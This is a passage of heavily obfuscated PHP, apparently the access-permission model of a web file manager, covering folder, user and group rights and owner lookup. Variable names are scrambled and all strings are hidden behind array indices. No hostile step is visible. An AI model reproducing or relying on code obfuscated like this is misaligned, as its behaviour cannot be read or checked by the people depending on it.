$‘¢ÇÀ±’[12], $‘¢ÇÀ±’[402]); if (!$ı€Ñìà) { return array(); } $’‹Å„Â† = $‘¢ÇÀ±’[2033]; $›…©£À = array($‘¢ÇÀ±’[402] => array($‘¢ÇÀ±’[7], $ı€Ñìà), $‘¢ÇÀ±’[431] => $‘¢ÇÀ±’[197]); $—‘ó¸ë = Model($‘¢ÇÀ±’[832])->field($’‹Å„Â†)->where($›…©£À)->select(); $±ÕÊŸ–À = array($¥Ö“ÊÆº); foreach ($—‘ó¸ë as $ª…ìÚö) { foreach ($¤öªÀ¢² as $ôñ”îŸ) { $º«ï ¥§ = $‘¢ÇÀ±’[50] . $ôñ”îŸ . $‘¢ÇÀ±’[50]; $îï £éº = $ª…ìÚö[$‘¢ÇÀ±’[521]] . $ª…ìÚö[$‘¢ÇÀ±’[402]] . $‘¢ÇÀ±’[50]; if (strstr($îï £éº, $º«ï ¥§)) { $±ÕÊŸ–À[] = $ª…ìÚö[$‘¢ÇÀ±’[402]]; break; } } } return $this->sourceListAuth($±ÕÊŸ–À); } private function sourceListAuth($ŠÂ”š‰ã) { $–†°„ÈÂ =& $_SERVER[ĞÂ¤àÓï]; $£ø¿Êê° = Model($–†°„ÈÂ[1336])->sourceListInfo($ŠÂ”š‰ã, !0); $¢€âû¤À = $this->sourceAuthSelect($ŠÂ”š‰ã); $õÉá“µ = array(); $÷Õû´È  = array(); foreach ($£ø¿Êê° as $ì·´Œ”) { unset($ì·´Œ”[$–†°„ÈÂ[456]]); unset($ì·´Œ”[$–†°„ÈÂ[454]]); unset($ì·´Œ”[$–†°„ÈÂ[413]]); unset($ì·´Œ”[$–†°„ÈÂ[86]]); $é­¯¯£ì = $¢€âû¤À[$ì·´Œ”[$–†°„ÈÂ[402]]]; if (!$é­¯¯£ì) { continue; } $ì·´Œ”[$–†°„ÈÂ[2034]] = $this->authTargetInfo($é­¯¯£ì); $ì·´Œ”[$–†°„ÈÂ[519]] = rtrim($ì·´Œ”[$–†°„ÈÂ[525]], $–†°„ÈÂ[8]) . $–†°„ÈÂ[8] . ltrim($ì·´Œ”[$–†°„ÈÂ[519]], $–†°„ÈÂ[8]); $õÉá“µ[] = $ì·´Œ”; $¿ıèŠ°‘ = count(explode($–†°„ÈÂ[8], trim($ì·´Œ”[$–†°„ÈÂ[519]], $–†°„ÈÂ[8]))); $÷Õû´È [] = $¿ıèŠ°‘ + ($ì·´Œ”[$–†°„ÈÂ[33]] == $–†°„ÈÂ[75] ? 0 : 1000); } array_multisort($÷Õû´È , SORT_ASC, $õÉá“µ); return $õÉá“µ; } private function groupChidldAllRootSource($ºõüÖ¬ş) { $Ú¤¶Ú³² =& $_SERVER[ĞÂ¤àÓï]; $Š×õ«ë = Model($Ú¤¶Ú³²[2035])->groupChildrenAll($ºõüÖ¬ş); $çïİÍş± = array($Ú¤¶Ú³²[432] => 0, $Ú¤¶Ú³²[505] => array($Ú¤¶Ú³²[7], $Š×õ«ë), $Ú¤¶Ú³²[411] => SourceModel::TYPE_GROUP); $çñ¤ÂÆ­ = Model($Ú¤¶Ú³²[832])->field($Ú¤¶Ú³²[402])->where($çïİÍş±)->select(); $çñ¤ÂÆ­ = array_to_keyvalue($çñ¤ÂÆ­, $Ú¤¶Ú³²[12], $Ú¤¶Ú³²[402]); return $çñ¤ÂÆ­; } private function authTargetInfo($«†‰šŞá) { $Ó°³€ƒÈ =& $_SERVER[ĞÂ¤àÓï]; $Üíãúû¹ = array(); $¶ÁÄÔ· = array(); $Šˆ˜”ü“ = 2 << 25; foreach ($«†‰šŞá as $Ê—Š÷Ï¿) { $§°ÄÁáò = Model($Ó°³€ƒÈ[507])->listData($Ê—Š÷Ï¿[$Ó°³€ƒÈ[1958]]); if (!$§°ÄÁáò) { continue; } if ($Ê—Š÷Ï¿[$Ó°³€ƒÈ[411]] == SourceModel::TYPE_USER) { $»‡àä÷÷ = Model($Ó°³€ƒÈ[513])->getInfoSimpleOuter($Ê—Š÷Ï¿[$Ó°³€ƒÈ[505]]); if ($»‡àä÷÷[$Ó°³€ƒÈ[1664]] == $Ó°³€ƒÈ[1189]) { continue; } if ($»‡àä÷÷[$Ó°³€ƒÈ[1664]] == $Ó°³€ƒÈ[197]) { $»‡àä÷÷[$Ó°³€ƒÈ[32]] = LNG($Ó°³€ƒÈ[2036]); } } else { $»‡àä÷÷ = Model($Ó°³€ƒÈ[522])->getInfoSimple($Ê—Š÷Ï¿[$Ó°³€ƒÈ[505]]); } if (!$»‡àä÷÷) { continue; } $»‡àä÷÷[$Ó°³€ƒÈ[467]] = $§°ÄÁáò; $Üíãúû¹[] = $»‡àä÷÷; $£Òª£ºÖ = 0; if ($Ê—Š÷Ï¿[$Ó°³€ƒÈ[411]] == SourceModel::TYPE_GROUP) { $£Òª£ºÖ = $Šˆ˜”ü“ * 2; } if ($Ê—Š÷Ï¿[$Ó°³€ƒÈ[411]] == SourceModel::TYPE_USER) { $£Òª£ºÖ = $Šˆ˜”ü“; } if ($Ê—Š÷Ï¿[$Ó°³€ƒÈ[411]] == SourceModel::TYPE_USER && $Ê—Š÷Ï¿[$Ó°³€ƒÈ[505]] == $Ó°³€ƒÈ[197]) { $£Òª£ºÖ = 0; } $¶ÁÄÔ·[] = $§°ÄÁáò[$Ó°³€ƒÈ[413]] + $£Òª£ºÖ; } array_multisort($¶ÁÄÔ·, SORT_DESC, $Üíãúû¹); return $Üíãúû¹; } public function getAllChildrenByUser($ò·ˆ›×, $£éáîè¦) { $ôŠúë¯Æ =& $_SERVER[ĞÂ¤àÓï]; $Ğ©›ëÎı = Model($ôŠúë¯Æ[535])->getInfo($£éáîè¦); if (!$£éáîè¦ || !$ò·ˆ›× || !$Ğ©›ëÎı) { return array(); } $Ü“Û»ß = Model($ôŠúë¯Æ[1336])->sourceInfo($ò·ˆ›×); $Ç¿•òÃ = array(); $ÜÊÑÊÉ§ = 1; if ($Ü“Û»ß[$ôŠúë¯Æ[432]] == $ôŠúë¯Æ[197] && $Ü“Û»ß[$ôŠúë¯Æ[505]] != $ÜÊÑÊÉ§ && $this->groupContainUser($Ü“Û»ß[$ôŠúë¯Æ[505]], $£éáîè¦)) { foreach ($Ğ©›ëÎı[$ôŠúë¯Æ[2037]] as $şœ¼æÊş) { $ç£—Œø‹ = Model($ôŠúë¯Æ[522])->getInfo($şœ¼æÊş[$ôŠúë¯Æ[1854]]); $º¿Ğµ–„ = Model($ôŠúë¯Æ[535])->getInfoSimpleOuter($£éáîè¦); $º¿Ğµ–„[$ôŠúë¯Æ[467]] = $şœ¼æÊş[$ôŠúë¯Æ[413]]; if (Model($ôŠúë¯Æ[507])->authCheckAction($şœ¼æÊş[$ôŠúë¯Æ[413]][$ôŠúë¯Æ[413]], $ôŠúë¯Æ[1875])) { continue; } $»ø·ĞÁŞ = array($ôŠúë¯Æ[32] => $ôŠúë¯Æ[1209] . $ç£—Œø‹[$ôŠúë¯Æ[32]], $ôŠúë¯Æ[402] => $ç£—Œø‹[$ôŠúë¯Æ[86]][$ôŠúë¯Æ[402]], $ôŠúë¯Æ[84] => KodIO::make($ç£—Œø‹[$ôŠúë¯Æ[86]][$ôŠúë¯Æ[402]]), $ôŠúë¯Æ[432] => $ôŠúë¯Æ[197], $ôŠúë¯Æ[411] => $ôŠúë¯Æ[515], $ôŠúë¯Æ[33] => $ôŠúë¯Æ[554], $ôŠúë¯Æ[519] => $ç£—Œø‹[$ôŠúë¯Æ[526]], $ôŠúë¯Æ[1854] => $ç£—Œø‹[$ôŠúë¯Æ[1854]], $ôŠúë¯Æ[523] => $ç£—Œø‹[$ôŠúë¯Æ[432]], $ôŠúë¯Æ[2034] => array($º¿Ğµ–„)); $Ç¿•òÃ[$»ø·ĞÁŞ[$ôŠúë¯Æ[402]]] = $»ø·ĞÁŞ; } } $åùì¡´ï = array(); $ùœ·Îœô = $this->getAllChildren($ò·ˆ›×); foreach ($ùœ·Îœô as $ÈùÔˆ×ß) { $ß–äœ›ı = !1; foreach ($ÈùÔˆ×ß[$ôŠúë¯Æ[2034]] as $ª‹¸Ÿí¾) { if ($ª‹¸Ÿí¾[$ôŠúë¯Æ[1664]]) { if ($ª‹¸Ÿí¾[$ôŠúë¯Æ[1664]] == $£éáîè¦) { $ß–äœ›ı = !0; break; } } if ($ª‹¸Ÿí¾[$ôŠúë¯Æ[1854]]) { if ($this->groupContainUser($ª‹¸Ÿí¾[$ôŠúë¯Æ[1854]], $£éáîè¦)) { $ß–äœ›ı = !0; break; } } } if ($ß–äœ›ı) { $åùì¡´ï[] = $ÈùÔˆ×ß; } $›¾œòŒå = $ÈùÔˆ×ß[$ôŠúë¯Æ[402]]; if (isset($Ç¿•òÃ[$›¾œòŒå])) { $ÈùÔˆ×ß[$ôŠúë¯Æ[2034]][] = $Ç¿•òÃ[$›¾œòŒå][0]; $Ç¿•òÃ[$›¾œòŒå] = !1; } } $Ç¿•òÃ = array_filter(array_values($Ç¿•òÃ)); $åùì¡´ï = array_merge($Ç¿•òÃ, $åùì¡´ï); return $åùì¡´ï; } public function setAllChildrenByUser($êŸ¬¶Ò‘, $úÀÚÒ…œ, $Èóñğ½£) { $Øáğ’Ò =& $_SERVER[ĞÂ¤àÓï]; $Ü‚ù£¡ï = $this->getAllChildrenByUser($êŸ¬¶Ò‘, $úÀÚÒ…œ); if (!$Èóñğ½£ || !$Ü‚ù£¡ï) { return !1; } foreach ($Ü‚ù£¡ï as $ùú×…Á) { $úúÕÃÚ© = array(); foreach ($ùú×…Á[$Øáğ’Ò[2034]] as $¿õŞ¶‚) { $„ãÔ˜ã = $¿õŞ¶‚[$Øáğ’Ò[467]]; $ä«ªöµ = $¿õŞ¶‚[$Øáğ’Ò[1664]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ª³¹áª‰ = $¿õŞ¶‚[$Øáğ’Ò[1664]] ? $¿õŞ¶‚[$Øáğ’Ò[1664]] : $¿õŞ¶‚[$Øáğ’Ò[1854]]; if ($¿õŞ¶‚[$Øáğ’Ò[1664]] && $¿õŞ¶‚[$Øáğ’Ò[1664]] == $úÀÚÒ…œ) { continue; } $úúÕÃÚ©[] = array($Øáğ’Ò[402] => $ùú×…Á[$Øáğ’Ò[402]], $Øáğ’Ò[411] => $ä«ªöµ, $Øáğ’Ò[505] => intval($ª³¹áª‰), $Øáğ’Ò[1958] => isset($„ãÔ˜ã[$Øáğ’Ò[399]]) ? intval($„ãÔ˜ã[$Øáğ’Ò[399]]) : 0, $Øáğ’Ò[2014] => isset($„ãÔ˜ã[$Øáğ’Ò[2014]]) ? intval($„ãÔ˜ã[$Øáğ’Ò[2014]]) : -1); } $úúÕÃÚ©[] = array($Øáğ’Ò[402] => $ùú×…Á[$Øáğ’Ò[402]], $Øáğ’Ò[411] => SourceModel::TYPE_USER, $Øáğ’Ò[505] => intval($úÀÚÒ…œ), $Øáğ’Ò[1958] => intval($Èóñğ½£), $Øáğ’Ò[2014] => -1); $this->where(array($Øáğ’Ò[417] => $ùú×…Á[$Øáğ’Ò[402]]))->delete(); $this->addAll($úúÕÃÚ©); } return !0; } public function get($Øê‹”Ô¯) { $û‘ä¼àÈ = $this->getSourceList(array($Øê‹”Ô¯), !0); return $û‘ä¼àÈ[0]; } public function getSourceList($Ü“Ì…í³, $œúè§±ü = false, $³œ¾¡Ê• = false) { $ÍÆÚáæ =& $_SERVER[ĞÂ¤àÓï]; if (!$Ü“Ì…í³) { return array(); } $ãˆï”¦„ = Model($ÍÆÚáæ[1336]); if (!$œúè§±ü && count($Ü“Ì…í³) == 1) { $œúè§±ü = array(); $œúè§±ü[$Ü“Ì…í³[0]] = $ãˆï”¦„->sourceInfo($Ü“Ì…í³[0]); } if (!$œúè§±ü) { $Œù¯Ö¦ = array($ÍÆÚáæ[417] => array($ÍÆÚáæ[418], $Ü“Ì…í³)); $œúè§±ü = $ãˆï”¦„->field($ÍÆÚáæ[2038])->where($Œù¯Ö¦)->select(); $œúè§±ü = array_to_keyvalue($œúè§±ü, $ÍÆÚáæ[402]); } $óìî³–ú = $Ü“Ì…í³; foreach ($œúè§±ü as $ığÑÎªø => $îÜ…¸˜õ) { $µİõ»”› = $ãˆï”¦„->parentLevelArray($îÜ…¸˜õ[$ÍÆÚáæ[521]]); $óìî³–ú = array_merge($óìî³–ú, array($ığÑÎªø), array_reverse($µİõ»”›)); } $óìî³–ú = array_values(array_unique($óìî³–ú)); if (!$óìî³–ú) { return array(); } $É¹ÓÌØ“ = $this->sourceAuthSelect($óìî³–ú); $å“ªÌ×¨ = array(); foreach ($óìî³–ú as $ÀÏË‡Ôï) { if (isset($É¹ÓÌØ“[$ÀÏË‡Ôï])) { $å“ªÌ×¨[$ÀÏË‡Ôï] = $É¹ÓÌØ“[$ÀÏË‡Ôï]; } } $£°¶òæÂ = $this->userIsRoot($³œ¾¡Ê•); $àèã¢Ò“ = AuthModel::authAll(); $¬ŸÂ‘¥í = array($ÍÆÚáæ[414] => $àèã¢Ò“, $ÍÆÚáæ[2039] => array($ÍÆÚáæ[419] => 0, $ÍÆÚáæ[1860] => $àèã¢Ò“, $ÍÆÚáæ[420] => LNG($ÍÆÚáæ[2040]), $ÍÆÚáæ[1877] => $ÍÆÚáæ[2041])); $ªò™ŸÛĞ = array(); foreach ($œúè§±ü as $ÀÏË‡Ôï => $Òøª„™ê) { if ($£°¶òæÂ && $GLOBALS[$ÍÆÚáæ[6]][$ÍÆÚáæ[1873]]) { $ªò™ŸÛĞ[$ÀÏË‡Ôï] = $¬ŸÂ‘¥í; continue; } $ªò™ŸÛĞ[$ÀÏË‡Ôï] = $this->makeSourceAuth($Òøª„™ê, $å“ªÌ×¨, $³œ¾¡Ê•); } return $ªò™ŸÛĞ; } public function authDeepCheck($«ñ‡°±ü, $îşµ³ú¯ = false) { $ŸÓµÚáó =& $_SERVER[ĞÂ¤àÓï]; $îşµ³ú¯ = $îşµ³ú¯ ? $îşµ³ú¯ : USER_ID; $…ÙŞ£Œ¦ = $this->makeAuthDeep($îşµ³ú¯); if (!in_array($«ñ‡°±ü, $…ÙŞ£Œ¦[$ŸÓµÚáó[2042]])) { return !1; } $‹Æøşßå = array(); foreach ($…ÙŞ£Œ¦[$ŸÓµÚáó[2043]] as $®ë„™¾œ => $×Ä´¢úé) { if (!in_array($«ñ‡°±ü, $×Ä´¢úé)) { continue; } $‹Æøşßå[] = $®ë„™¾œ; } if (!$‹Æøşßå) { return !1; } $ºíğ×ğµ = $‹Æøşßå ? $‹Æøşßå[0] : $«ñ‡°±ü; return array($ŸÓµÚáó[414] => -1, $ŸÓµÚáó[467] => array($ŸÓµÚáó[419] => $ŸÓµÚáó[1189], $ŸÓµÚáó[1860] => $ŸÓµÚáó[197], $ŸÓµÚáó[420] => LNG($ŸÓµÚáó[2044]), $ŸÓµÚáó[1877] => $ŸÓµÚáó[2045]), $ŸÓµÚáó[2046] => LNG($ŸÓµÚáó[2047]), $ŸÓµÚáó[2048] => $this->sourceAuthInfo($ºíğ×ğµ)); } protected function makeAuthDeep($ÖÕ“ÊÈ… = false) { $šàÙ¼ç“ =& $_SERVER[ĞÂ¤àÓï]; static $è¶¡°‰Î = array(); $ÖÕ“ÊÈ… = $ÖÕ“ÊÈ… ? $ÖÕ“ÊÈ… : USER_ID; if (isset($è¶¡°‰Î[$ÖÕ“ÊÈ…])) { return $è¶¡°‰Î[$ÖÕ“ÊÈ…]; } $ÉªŞ­¸¤ = Model($šàÙ¼ç“[2049])->listData(); $¿Ï‹¦‘ = array(); foreach ($ÉªŞ­¸¤ as $À“ô£ã) { if ($À“ô£ã[$šàÙ¼ç“[413]] == 0 && $À“ô£ã[$šàÙ¼ç“[1876]] == $šàÙ¼ç“[88]) { $¿Ï‹¦‘[] = $À“ô£ã[$šàÙ¼ç“[399]]; } } $«‹³êû§ = $this->userGroupParents($ÖÕ“ÊÈ…); $ñ¼–ëœ = array($šàÙ¼ç“[411] => SourceModel::TYPE_USER, $šàÙ¼ç“[505] => $ÖÕ“ÊÈ…); if ($«‹³êû§) { $ñ¼–ëœ = array(array($šàÙ¼ç“[411] => SourceModel::TYPE_USER, $šàÙ¼ç“[505] => $ÖÕ“ÊÈ…), array($šàÙ¼ç“[411] => SourceModel::TYPE_GROUP, $šàÙ¼ç“[505] => array($šàÙ¼ç“[418], $«‹³êû§)), $šàÙ¼ç“[1000] => $šàÙ¼ç“[1952]); } $÷°ù“‹ü = $this->field($šàÙ¼ç“[2050])->where($ñ¼–ëœ)->select(); $Âñ¥áÃ¹ = array(); $â×­§‘Å = array_to_keyvalue_group($÷°ù“‹ü, $šàÙ¼ç“[402]); foreach ($â×­§‘Å as $Üó†àõ• => $Ó”Ô»Æ˜) { $ÏÖœ²˜Ş = $this->authArrayCheck($Ó”Ô»Æ˜, $ÖÕ“ÊÈ…); if ($ÏÖœ²˜Ş[$šàÙ¼ç“[414]] > 0) { $Âñ¥áÃ¹[] = $Üó†àõ• . $šàÙ¼ç“[12]; } } if ($«‹³êû§) { $Úşıª¥ã = Model($šàÙ¼ç“[522]); foreach ($«‹³êû§ as $úÚ¤¶¬Ã) { $á·¼À½Ğ = $Úşıª¥ã->getInfo($úÚ¤¶¬Ã); if (!$á·¼À½Ğ || !is_array($á·¼À½Ğ[$šàÙ¼ç“[86]])) { continue; } $Âñ¥áÃ¹[] = $á·¼À½Ğ[$šàÙ¼ç“[86]][$šàÙ¼ç“[402]]; } } $°¼Ø²“ = array(); $€ š¡‚Ÿ = $«‹³êû§; $±æºª = Model($šàÙ¼ç“[1336]); $Úşıª¥ã = Model($šàÙ¼ç“[522]); $ä”·Úë = array(); $°÷¹Â•… = array(); $äÁú×Ò = array(); $ÙÃ”ĞÃ¼ = array(); if ($Âñ¥áÃ¹) { $”ûÚŒø‘ = $±æºª->where(array($šàÙ¼ç“[402] => array($šàÙ¼ç“[418], $Âñ¥áÃ¹)))->select(); foreach ($”ûÚŒø‘ as $§ÚâË¥…) { $öÎı¨í = $±æºª->parentLevelArray($§ÚâË¥…[$šàÙ¼ç“[521]]); $°¼Ø²“ = array_merge($°¼Ø²“, $öÎı¨í); $€ š¡‚Ÿ[] = $§ÚâË¥…[$šàÙ¼ç“[505]]; $ä”·Úë[$§ÚâË¥…[$šàÙ¼ç“[402]]] = $öÎı¨í; $°÷¹Â•…[$§ÚâË¥…[$šàÙ¼ç“[402]]] = $§ÚâË¥…[$šàÙ¼ç“[505]]; } } $€ š¡‚Ÿ = array_values(array_unique($€ š¡‚Ÿ)); $çŒÍ„Ş = $€ š¡‚Ÿ; foreach ($çŒÍ„Ş as $úÚ¤¶¬Ã) { $á·¼À½Ğ = $Úşıª¥ã->getInfo($úÚ¤¶¬Ã); $öÎı¨í = $±æºª->parentLevelArray($á·¼À½Ğ[$šàÙ¼ç“[521]]); $€ š¡‚Ÿ = array_merge($€ š¡‚Ÿ, $öÎı¨í); } $€ š¡‚Ÿ = array_values(array_unique($€ š¡‚Ÿ)); foreach ($€ š¡‚Ÿ as $úÚ¤¶¬Ã) { $á·¼À½Ğ = $Úşıª¥ã->getInfo($úÚ¤¶¬Ã); $°¼Ø²“[] = $á·¼À½Ğ[$šàÙ¼ç“[86]][$šàÙ¼ç“[402]]; $äÁú×Ò[$úÚ¤¶¬Ã] = $á·¼À½Ğ[$šàÙ¼ç“[86]][$šàÙ¼ç“[402]]; $ÙÃ”ĞÃ¼[$úÚ¤¶¬Ã] = $±æºª->parentLevelArray($á·¼À½Ğ[$šàÙ¼ç“[521]]); } foreach ($ä”·Úë as $öêÜ²ş => $È‰èáôÍ) { $§»øÒïú = $°÷¹Â•…[$öêÜ²ş]; if (!$§»øÒïú || !$äÁú×Ò[$§»øÒïú]) { continue; } $‚Ü«÷‡ = array(); foreach ($ÙÃ”ĞÃ¼[$§»øÒïú] as $úÚ¤¶¬Ã) { $‚Ü«÷‡[] = $äÁú×Ò[$úÚ¤¶¬Ã]; } $ä”·Úë[$öêÜ²ş] = array_merge($‚Ü«÷‡, $È‰èáôÍ); } $°¼Ø²“ = array_values(array_unique($°¼Ø²“)); $×Á¡ß¸ù = array($šàÙ¼ç“[2042] => $°¼Ø²“, $šàÙ¼ç“[2043] => $ä”·Úë); $è¶¡°‰Î[$ÖÕ“ÊÈ…] = $×Á¡ß¸ù; return $×Á¡ß¸ù; } private function makeSourceAuth($„ÍÛÍÄ¯, $½Ü”ñĞ, $µ¶íÒ© = false) { $œ½ë—ò÷ =& $_SERVER[ĞÂ¤àÓï]; $èªÙ§ˆ‰ = $œ½ë—ò÷[88]; $£üáì  = $„ÍÛÍÄ¯[$œ½ë—ò÷[505]]; $şûÖÉ·¢ = $„ÍÛÍÄ¯[$œ½ë—ò÷[411]] == SourceModel::TYPE_GROUP; $„¸å¿ßª = $şûÖÉ·¢ ? $this->groupRootAuth($£üáì , $µ¶íÒ©) : !1; if ($„¸å¿ßª && Model($œ½ë—ò÷[507])->authCheckAction($„¸å¿ßª[$œ½ë—ò÷[413]], $œ½ë—ò÷[1875])) { return $this->groupAuthInfo($„¸å¿ßª, $£üáì ); } $—Éøê¼ = Model($œ½ë—ò÷[1336])->parentLevelArray($„ÍÛÍÄ¯[$œ½ë—ò÷[521]]); $—Éøê¼ = array_merge(array($„ÍÛÍÄ¯[$œ½ë—ò÷[402]]), array_reverse($—Éøê¼)); $üÌ„å¢ = !1; foreach ($—Éøê¼ as $Àº¥Â¦â) { if (!isset($½Ü”ñĞ[$Àº¥Â¦â])) { continue; } $äİ±÷—» = $this->authMake($½Ü”ñĞ[$Àº¥Â¦â], $µ¶íÒ©); if ($äİ±÷—»[$œ½ë—ò÷[467]]) { $üÌ„å¢ = $äİ±÷—»; break; } } if (!$şûÖÉ·¢) { return $üÌ„å¢; } if (!$üÌ„å¢ && $„¸å¿ßª) { $üÌ„å¢ = $this->groupAuthInfo($„¸å¿ßª, $£üáì ); } if (!$üÌ„å¢) { $–üáÕ±Ì = Model($œ½ë—ò÷[522])->getInfo($£üáì ); $øÕ¶áçÆ = explode($œ½ë—ò÷[50], trim($–üáÕ±Ì[$œ½ë—ò÷[521]], $œ½ë—ò÷[50])); $øÕ¶áçÆ = array_reverse($øÕ¶áçÆ); foreach ($øÕ¶áçÆ as $ŒıîÛœÏ) { if ($ŒıîÛœÏ == $œ½ë—ò÷[197] || $ŒıîÛœÏ == $èªÙ§ˆ‰) { continue; } $¬ÚÔúÃ™ = $this->groupRootAuth($ŒıîÛœÏ, $µ¶íÒ©); if (!$¬ÚÔúÃ™) { continue; } $üÌ„å¢ = $this->groupAuthInfo($¬ÚÔúÃ™, $ŒıîÛœÏ); break; } } if (!$üÌ„å¢ || $üÌ„å¢[$œ½ë—ò÷[414]] <= 0) { $¤®™«¼ = $this->authDeepCheck($„ÍÛÍÄ¯[$œ½ë—ò÷[402]], $µ¶íÒ©); if ($¤®™«¼) { $üÌ„å¢ = $¤®™«¼; } } return $üÌ„å¢; } private function userIsRoot($©ª³‹ı÷ = false) { $æ”ÍŠ‘± =& $_SERVER[ĞÂ¤àÓï]; if (!$©ª³‹ı÷ && _get($GLOBALS, $æ”ÍŠ‘±[503])) { return !0; } $µ˜ ñ°â = Model($æ”ÍŠ‘±[535])->getInfo($©ª³‹ı÷); $Æ§¤‹Ì = Model($æ”ÍŠ‘±[2051])->listData($µ˜ ñ°â[$æ”ÍŠ‘±[1545]]); if ($Æ§¤‹Ì && $Æ§¤‹Ì[$æ”ÍŠ‘±[511]][$æ”ÍŠ‘±[2052]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ş£ŒÎ) { $àÀ×¾° =& $_SERVER[ĞÂ¤àÓï]; $ò¥Ì©¶´ = Model($àÀ×¾°[1336]); $À¤š†¢¸ = $ò¥Ì©¶´->sourceInfo($ş£ŒÎ); if (!$À¤š†¢¸) { return !1; } $ò¥Ì©¶´->groupPathDisplay($À¤š†¢¸); $»„¼éó§ = array($À¤š†¢¸); $»„¼éó§ = $ò¥Ì©¶´->_listAppendPath($»„¼éó§); $À¤š†¢¸ = $»„¼éó§[0]; $¡áŸ‘µß = $À¤š†¢¸[$àÀ×¾°[519]]; if (isset($À¤š†¢¸[$àÀ×¾°[527]])) { $ÁÌÈ™î† = explode($àÀ×¾°[8], trim($À¤š†¢¸[$àÀ×¾°[519]], $àÀ×¾°[8])); array_shift($ÁÌÈ™î†); $¡áŸ‘µß = $À¤š†¢¸[$àÀ×¾°[525]] . $àÀ×¾°[2053] . implode($àÀ×¾°[8], $ÁÌÈ™î†); } return array($àÀ×¾°[420] => $À¤š†¢¸[$àÀ×¾°[32]], $àÀ×¾°[84] => KodIO::make($À¤š†¢¸[$àÀ×¾°[402]]), $àÀ×¾°[2054] => $¡áŸ‘µß); } private function groupAuthInfo($î™Êİ‘Ô, $¿÷‹ëÔ§) { $ªáµºÎ¾ =& $_SERVER[ĞÂ¤àÓï]; $Ú‹¬Ì÷´ = Model($ªáµºÎ¾[522])->getInfo($¿÷‹ëÔ§); return array($ªáµºÎ¾[2055] => intval($î™Êİ‘Ô[$ªáµºÎ¾[413]]), $ªáµºÎ¾[2039] => $î™Êİ‘Ô, $ªáµºÎ¾[2056] => LNG($ªáµºÎ¾[2057]), $ªáµºÎ¾[2048] => array($ªáµºÎ¾[420] => $Ú‹¬Ì÷´[$ªáµºÎ¾[32]], $ªáµºÎ¾[84] => KodIO::make($Ú‹¬Ì÷´[$ªáµºÎ¾[86]][$ªáµºÎ¾[402]]), $ªáµºÎ¾[2054] => $Ú‹¬Ì÷´[$ªáµºÎ¾[526]])); } protected function groupRootAuth($‰ÔÎÄêğ, $·¢´ŒÙ¢ = false) { $í“ñç =& $_SERVER[ĞÂ¤àÓï]; $·¢´ŒÙ¢ = $·¢´ŒÙ¢ ? $·¢´ŒÙ¢ : USER_ID; $¶è¥‘ö = $·¢´ŒÙ¢ . $í“ñç[2058] . $‰ÔÎÄêğ; static $°Å¿÷›£ = array(); if (isset($°Å¿÷›£[$¶è¥‘ö])) { return $°Å¿÷›£[$¶è¥‘ö]; } $ßç¥¿ = Model($í“ñç[522])->getInfo($‰ÔÎÄêğ); $äÅÑ¾ø = $this->userGroupList($·¢´ŒÙ¢); $ß«±ü‡Ï = isset($äÅÑ¾ø[$‰ÔÎÄêğ]) ? $äÅÑ¾ø[$‰ÔÎÄêğ][$í“ñç[413]] : !1; if ($ß«±ü‡Ï && Model($í“ñç[507])->authCheckAction($ß«±ü‡Ï[$í“ñç[413]], $í“ñç[1875])) { $°Å¿÷›£[$¶è¥‘ö] = $ß«±ü‡Ï; return $ß«±ü‡Ï; } $È÷Úı’Å = $this->sourceAuthSelect($ßç¥¿[$í“ñç[86]][$í“ñç[402]]); $ÓáıØøÃ = $È÷Úı’Å ? $this->authMake($È÷Úı’Å, $·¢´ŒÙ¢) : !1; $ƒüúİ×À = $ÓáıØøÃ ? $ÓáıØøÃ[$í“ñç[467]] : !1; $°Å¿÷›£[$¶è¥‘ö] = $ƒüúİ×À ? $ƒüúİ×À : $ß«±ü‡Ï; return $°Å¿÷›£[$¶è¥‘ö]; } public function authOwnerApply($Ğàœ“¦) { $ø†††ÚÂ =& $_SERVER[ĞÂ¤àÓï]; if (empty($Ğàœ“¦[$ø†††ÚÂ[413]]) || isset($Ğàœ“¦[$ø†††ÚÂ[2059]]) && $Ğàœ“¦[$ø†††ÚÂ[2059]]) { return $Ğàœ“¦; } if (AuthModel::authCheckRoot($Ğàœ“¦[$ø†††ÚÂ[413]][$ø†††ÚÂ[414]])) { return $Ğàœ“¦; } $®àÚ…¦ = Model($ø†††ÚÂ[1336])->parentLevelArray($Ğàœ“¦[$ø†††ÚÂ[521]]); $®àÚ…¦ = array_merge(array($Ğàœ“¦[$ø†††ÚÂ[402]]), array_reverse($®àÚ…¦)); $£†ÎšÊş = $this->sourceAuthSelect($®àÚ…¦); $¨Ç³ÊÃ = array(); $ü‘äü¹ï = array(); foreach ($£†ÎšÊş as $ş®†êâ— => $¿¬‡ÑÛ˜) { $›´ø¸’© = $this->authFolderOwnerUser($¿¬‡ÑÛ˜); $¨Ç³ÊÃ[$ş®†êâ—] = $›´ø¸’©; $ü‘äü¹ï = array_merge($ü‘äü¹ï, $›´ø¸’©[$ø†††ÚÂ[600]]); if ($›´ø¸’©[$ø†††ÚÂ[2060]]) { break; } } if (count($ü‘äü¹ï) == 0) { $ü‘äü¹ï = $this->authFolderOwnerGroup($Ğàœ“¦[$ø†††ÚÂ[505]]); } $ü‘äü¹ï = array_unique($ü‘äü¹ï); if (AuthModel::authCheckRoot($Ğàœ“¦[$ø†††ÚÂ[413]][$ø†††ÚÂ[414]])) { $ü‘äü¹ï[] = USER_ID; } $Ğàœ“¦[$ø†††ÚÂ[413]][$ø†††ÚÂ[2061]] = Model($ø†††ÚÂ[513])->userListInfo($ü‘äü¹ï); return $Ğàœ“¦; } private function authFolderOwnerGroup($¼™à­€) { $¹çõÙş =& $_SERVER[ĞÂ¤àÓï]; $…ÜşÄº = Model($¹çõÙş[1944])->where(array($¹çõÙş[1854] => $¼™à­€))->select(); $œ‚›ä¯« = array(); if (!$…ÜşÄº) { return $œ‚›ä¯«; } foreach ($…ÜşÄº as $Ñ¨¿‰ï½) { $“‘ñµ˜Æ = $this->authInfo($Ñ¨¿‰ï½); if (AuthModel::authCheckRoot($“‘ñµ˜Æ[$¹çõÙş[413]])) { $œ‚›ä¯«[] = $Ñ¨¿‰ï½[$¹çõÙş[1664]]; } } return $œ‚›ä¯«; } private function authFolderOwnerUser($†±ò‹ºÍ) { $†Ò½ò¶ =& $_SERVER[ĞÂ¤àÓï]; $Ú­ØŠÖ” = array(); $ƒˆ‡Œî¯ = !1; foreach ($†±ò‹ºÍ as $ÌŞÎª­) { $ƒ·‚‘´ = $this->authInfo($ÌŞÎª­); if 